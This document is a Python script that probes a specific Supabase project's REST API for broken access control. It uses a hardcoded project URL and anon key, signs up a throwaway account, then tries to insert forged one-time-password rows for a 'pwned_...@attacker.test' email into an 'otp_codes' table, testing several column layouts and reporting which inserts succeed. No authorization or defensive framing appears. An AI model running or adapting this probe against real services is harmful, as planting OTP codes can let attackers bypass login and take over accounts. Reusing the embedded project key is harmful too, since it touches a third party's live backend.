import urllib.request, urllib.error, ssl, json, time, datetime

BASE="https://iuqrarlmvuydxhiygkro.supabase.co"
ANON="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml1cXJhcmxtdnV5ZHhoaXlna3JvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzAzODI2NzUsImV4cCI6MjA4NTk1ODY3NX0.DCWPItRMC2aekqWjFoTGoROzzmR_q2uy2NjJK-nAxLg"
ctx=ssl.create_default_context()

def req(method, path, body=None, token=None, prefer="return=representation"):
    url=f"{BASE}{path}"
    data=json.dumps(body).encode() if body is not None else None
    h={"apikey":ANON,"Authorization":f"Bearer {token or ANON}","Content-Type":"application/json","Accept":"application/json"}
    if prefer: h["Prefer"]=prefer
    r=urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        resp=urllib.request.urlopen(r,timeout=20,context=ctx)
        return resp.status, resp.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace")
    except Exception as e:
        return "ERR", str(e)

# get an authed token too
s,o=req("POST","/auth/v1/signup",{"email":f"h{int(time.time())}@proton.me","password":"L@ntern2026!"})
tok=json.loads(o).get("access_token") if s==200 else None
print("authed token?", bool(tok))

exp=(datetime.datetime.utcnow()+datetime.timedelta(hours=1)).isoformat()+"Z"
target="pwned_"+str(int(time.time()))+"@attacker.test"
code="135790"

# try several column shapes
candidates=[
  {"email":target,"code":code},
  {"email":target,"code":code,"expires_at":exp},
  {"email":target,"code":code,"expires_at":exp,"used":False},
  {"email":target,"otp":code,"expires_at":exp},
  {"email":target,"code_hash":code,"expires_at":exp},
]
for tk,label in [(ANON,"anon"),(tok,"authed")]:
    print(f"\n######## insert as {label} ########")
    for c in candidates:
        s,o=req("POST","/rest/v1/otp_codes",c,token=tk)
        print(f"  {list(c.keys())} -> {s} {o[:200]}")
        if s in (200,201):
            print("  >>> INSERT OK")
